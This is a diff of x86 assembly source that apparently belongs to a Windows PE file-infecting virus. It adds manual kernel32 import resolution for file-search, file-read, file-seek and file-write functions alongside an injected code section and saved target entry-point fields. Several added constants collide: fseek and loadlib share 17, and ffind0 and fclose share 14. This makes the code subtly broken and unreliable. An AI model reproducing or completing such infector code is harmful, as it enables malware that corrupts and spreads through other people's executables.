@@ -5,9 +5,13 @@ old_entry:
     invoke ExitProcess, 0
 
 .code inject
-    strCFA db 'CreateFileA', 0
     strF1A db 'FindFirstFileA', 0
     strFNA db 'FindNextFileA', 0
+    strFC db 'FindClose', 0
+    strCFA db 'CreateFileA', 0
+    strSFP db 'SetFilePointerEx', 0
+    strCH db 'CloseHandle', 0
+    strRF db 'ReadFile', 0
     strWF db 'WriteFile', 0
     strLLA db 'LoadLibraryA', 0
     strGPA db 'GetProcAddress', 0
@@ -22,6 +26,8 @@ old_entry:
 	selfImageBaseAddress EQU 1
 	selfSection EQU 2
 	selfEntry EQU 3
+	readHand EQU 4
+	writeHand EQU 5
 	
 	tgImageBaseAddress EQU 1
     tgOldEntry EQU 2
@@ -34,6 +40,18 @@ old_entry:
     AddrTbl EQU 8
     k32NumFunc EQU 9
     user32dll EQU 10
+    
+    ffind1 EQU 12 		; FindFirstFileA
+    ffind2 EQU 13 		; FindNextFileA
+    ffind0 EQU 14 		; FindClose
+    fopen EQU 11 		; CreateFileA
+    fseek EQU 17 		; SetFilePointer(Ex)
+    fclose EQU 14 		; CloseHandle
+    fread EQU 15 		; ReadFile
+    fwrite EQU 16 		; WriteFile
+    loadlib EQU 17 		; LoadLibraryA
+    getaddr EQU 18 		; GetProcAddress
+    msgbox EQU 19 		; MessageBoxA
     
     stack_reserved EQU 10 ; Number of values to be stored in the stack
     regSz EQU 4 ; 8 for 64-bit
@@ -85,6 +103,46 @@ start:
     
     mov edx, [edi + 14h]
     toStack k32NumFunc, edx
+    
+    k32import offset strF1A
+    toStack ffind1
+    
+    k32import offset strFNA
+    toStack ffind2
+    
+    k32import offset strFC
+    toStack ffind0
+    
+    k32import offset strCFA
+    toStack fopen
+    
+    k32import offset strSFP
+    toStack fseek
+    
+    k32import offset strCH
+    toStack fclose
+    
+    k32import offset strRF
+    toStack fread
+    
+    k32import offset strWF
+    toStack fwrite
+    
+    k32import offset strLLA
+    mov edx, eax
+    toStack loadlib
+    
+    temp = offset stru32dll - offset strF1A
+   	fromStack selfSection, ecx
+   	add ecx, temp
+   	push ecx
+   	call edx
+    
+    toStack user32dll
+    
+    k32import offset strGPA
+    toStack getaddr
+    
     
     
 
